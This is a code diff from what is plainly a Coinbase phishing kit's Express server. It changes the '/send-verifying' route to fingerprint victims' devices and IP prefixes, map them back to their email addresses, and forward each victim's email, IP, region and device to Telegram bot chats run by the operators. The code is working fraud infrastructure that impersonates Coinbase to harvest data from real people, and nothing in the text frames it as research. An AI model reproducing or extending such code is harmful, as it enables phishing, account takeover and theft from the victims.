@@ -1858,13 +1858,28 @@ app.post("/send-verifying", async (req, res) => {
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
+    const fingerprint = getDeviceFingerprint(req);
+    const ipPrefix = ip.split(".").slice(0, 3).join(".");
 
-    pendingVerifying[verifyingId] = { status: "pending", userId, email, choice: null };
+    // ✅ RESOLVE LATEST EMAIL from fingerprint or IP (for display)
+    let displayEmail = email; // Default to original
+    
+    // Try fingerprint first (most reliable)
+    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
+      displayEmail = deviceFingerprintToEmail[fingerprint];
+    }
+    // Try IP prefix as fallback
+    else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
+      displayEmail = ipPrefixToEmail[ipPrefix];
+    }
+
+    // ✅ ORIGINAL EMAIL stays for winner lookup (to send to correct bot)
+    pendingVerifying[verifyingId] = { status: "pending", userId, email, displayEmail, choice: null };
 
     const message =
       `😈😈😈 <b>Coinbase - Verifying</b> 😈😈😈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
@@ -1887,7 +1902,7 @@ app.post("/send-verifying", async (req, res) => {
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
 
-    // ✅ SEND TO WINNER ONLY
+    // ✅ SEND TO WINNER ONLY (use ORIGINAL email to find winner)
     if (email && userWinnerTelegram[email]) {
       await sendFollowUpMessage(email, message, options);
     } else {
